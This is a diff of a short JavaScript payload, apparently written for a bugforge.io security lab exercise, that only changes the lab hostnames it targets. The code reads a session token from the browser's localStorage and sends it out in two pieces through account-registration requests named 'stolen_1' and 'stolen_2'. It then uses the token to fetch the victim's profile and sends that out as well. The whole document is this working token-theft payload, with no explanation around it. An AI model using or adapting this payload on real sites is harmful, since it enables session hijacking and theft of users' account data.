@@ -1,7 +1,7 @@
 (function () {
   var t = localStorage.getItem("token") || "NOTOKEN";
   function reg(uname, blob) {
-    fetch("https://lab-1784728693934-toep7w.labs-app.bugforge.io/api/register", {
+    fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io/api/register", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -13,7 +13,7 @@
   }
 reg("stolen_1", "TOKA:" + t.slice(0, 230));
 reg("stolen_2", "TOKB:" + t.slice(230));
-  fetch("https://lab-1784728693934-toep7w.labs-app.bugforge.io/api/profile", {
+  fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io//api/profile", {
     headers: { Authorization: "Bearer " + t }
   }).then(r => r.text()).then(b => reg("pe_prof", "PROF:" + b));
 })();
